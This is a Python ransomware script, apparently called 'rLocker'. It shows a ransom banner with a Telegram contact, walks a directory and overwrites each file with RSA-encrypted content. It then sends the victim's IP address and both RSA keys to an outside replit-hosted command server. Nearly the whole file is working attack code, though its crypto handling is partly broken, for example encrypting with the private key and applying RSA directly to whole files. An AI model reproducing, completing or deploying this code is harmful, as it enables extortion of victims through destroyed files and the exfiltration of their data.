import rsa
import os
import requests
import sys
from termcolor import colored


mainserver = "https://rLockerMainServer.ironislife98.repl.co"

print("""
           █████                         █████                        
          ░░███                         ░░███                         
 ████████  ░███         ██████   ██████  ░███ █████  ██████  ████████ 
░░███░░███ ░███        ███░░███ ███░░███ ░███░░███  ███░░███░░███░░███
 ░███ ░░░  ░███       ░███ ░███░███ ░░░  ░██████░  ░███████  ░███ ░░░ 
 ░███      ░███      █░███ ░███░███  ███ ░███░░███ ░███░░░   ░███     
 █████     ███████████░░██████ ░░██████  ████ █████░░██████  █████    
░░░░░     ░░░░░░░░░░░  ░░░░░░   ░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░     
""")

print(f"Oops! Your files have been {colored('encrypted', 'red', attrs=['reverse'])}!\n")
print(f"If you want them back, join the telegram at {colored('https://t.me/+uV87_B95rIgwNGI5', 'cyan')}")

public, private = rsa.newkeys(1024)
"""
with open("testkeys/public.pem", "wb") as f:
    f.write(public.save_pkcs1("PEM"))

with open("testkeys/private.pem", "wb") as f:
    f.write(private.save_pkcs1("PEM"))
"""

#with open("testkeys/public.pem", "rb") as f:
#    public = rsa.PublicKey.load_pkcs1(f.read())

#with open("testkeys/private.pem", "rb") as f:
#    private = rsa.PrivateKey.load_pkcs1(f.read())


FORMAT = "utf-8"


def encrypt(msg, key):
    return rsa.encrypt(msg.encode(FORMAT), key)


def decrypt(cipher, key):
    return rsa.decrypt(cipher, key).decode(FORMAT)


def sign(msg, key):
    return rsa.sign(msg.encode(FORMAT), key, "SHA-1")


def verify(msg, signature, key):
    return rsa.verify(msg.encode(FORMAT), signature, key) == "SHA-1"





def recurseAllFiles():
    path = "testkeys\\testdir"
    for root, dirs, files in os.walk(path):
        for name in files:
            yield os.path.join(root, name)


def encryptFile(path, key):
    with open(path, "rb") as f:
        data = f.read()

    try:
        with open(path, "wb") as f:
            f.write(encrypt(data.decode(FORMAT), key))
    except UnicodeDecodeError:
        with open(path, "wb") as f:
            f.write(data)


def decryptFile(path, key):
    with open(path, "rb") as f:
        data = f.read()
        print(type(data), data)

    with open(path, "wb") as f:
        f.write(decrypt(data, key).encode(FORMAT))


for filepath in recurseAllFiles():
    encryptFile(filepath, private)

#for filepath in recurseAllFiles():
 #   decryptFile(filepath, private)


def urlsafe(msg):
    output = str(msg).replace("/", "\\")
    return output


def findUUID():
    try:
        with open("uuid.rlocker") as f:
            pass
    except FileNotFoundError:
        return False
    with open("uuid.rlocker") as f:
        return f.read()


def getUUID() -> str:
    r = requests.get(f"{mainserver}/newid").json()
    return r["message"]


def registerWithDB(uuid):
    ip = requests.get("https://ipinfo.io/json").json()['ip']

    r = requests.get(f"{mainserver}/add/{uuid}/{ip}/{urlsafe(private.save_pkcs1())}/{urlsafe(public.save_pkcs1())}")


uuidexists = findUUID()
if not uuidexists:
    with open("uuid.rlocker", "w+") as f:
        uuid = getUUID()
        f.write(uuid)

        registerWithDB(uuid)

else:
    sys.exit()

